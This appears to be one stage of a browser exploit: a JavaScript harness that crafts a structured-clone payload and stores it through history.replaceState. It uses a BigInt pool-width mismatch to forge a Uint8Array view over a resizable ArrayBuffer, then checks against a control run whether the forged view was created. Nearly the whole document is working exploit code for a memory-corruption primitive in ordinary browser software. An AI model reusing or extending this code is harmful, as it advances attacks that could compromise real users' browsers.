// The verified 16-to-32-bit BigInt pool-width mismatch can reinterpret the
// StringData header as ArrayBufferViewTag (0x16) and Uint8Array subtag (0x02).
// The 8-bit string's data supplies a harmless offset 128, length 8, and an
// ObjectReferenceTag to the earlier RAB. This stage does not access that view.
function makePayload() {
  var bytes = [];
  for (var i = 0; i < 7; i++) bytes.push(0); // Offset high bytes; header provides low 0x80.
  bytes.push(8, 0, 0, 0, 0, 0, 0, 0); // byteLength = 8.
  bytes.push(0x13, 0, 0x80); // ObjectReferenceTag, pool index 0x8000.
  for (var j = 0; j < 8; j++) bytes.push(0xff); // Two array terminators.
  var prefix = String.fromCharCode.apply(null, bytes);
  return prefix + "A".repeat(0x21600 - prefix.length);
}
function run(id, useBigInt) {
  var phase = "build";
  var result;
  try {
    var backing = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(backing).fill(0x41);
    var filler = new Array(0xfffd);
    filler[0] = useBigInt ? BigInt(1) << BigInt(40) : {};
    for (var i = 1; i < filler.length; i++) filler[i] = {};
    filler[32766] = backing;
    var shared = { marker: 0x51515151 };
    var payload = makePayload();
    var input = new Array(0x10001);
    input[0] = filler;
    input[1] = shared;
    input[2] = shared;
    input[0x10000] = payload;
    if (useBigInt && api && typeof api.markSync === "function")
      api.markSync("synthetic_view_ready");
    phase = "store";
    history.replaceState(input, "");
    phase = "load";
    var output = history.state;
    if (useBigInt && api && typeof api.markSync === "function")
      api.markSync("synthetic_view_loaded");
    phase = "inspect";
    var outBacking = output[0] && output[0][32766];
    var synthetic = output[0x100001];
    var isView = synthetic instanceof Uint8Array;
    var correctControl = !useBigInt && output.length === input.length &&
      output[1] === output[2] && output[0x10000] === payload &&
      outBacking instanceof ArrayBuffer && outBacking.resizable === true &&
      new Uint8Array(outBacking)[0] === 0x41;
    result = { id: id, status: (useBigInt ? "fail" : correctControl ? "pass" : "fail"), details: {
      output_length: output.length,
      alias: output[1] === output[2],
      synthetic_is_u8: isView,
      synthetic_attached_to_target: isView && synthetic.buffer === outBacking,
      synthetic_offset: isView ? synthetic.byteOffset : null,
      synthetic_length: isView ? synthetic.byteLength : null,
      backing_length: outBacking && typeof outBacking.byteLength === "number" ? outBacking.byteLength : null,
      backing_max: outBacking && typeof outBacking.maxByteLength === "number" ? outBacking.maxByteLength : null,
      backing_canary: outBacking instanceof ArrayBuffer ? new Uint8Array(outBacking)[0] : null,
      original_payload_retained: output[0x10000] === payload
    } };
  } catch (error) {
    result = { id: id, status: "error", details: {
      phase: phase, error: String(error).slice(0, 200)
    } };
  }
  try { history.replaceState(null, ""); result.details.cleanup_ok = true; }
  catch (error) { result.status = "error"; result.details.cleanup_ok = false; }
  return result;
}
var control = run("synthetic_view_no_bigint_control", false);
if (control.status !== "pass")
  return [control, { id: "synthetic_view_bigint_case", status: "unsupported", details: { reason: "control_failed" } }];
return [control, run("synthetic_view_bigint_case", true)];
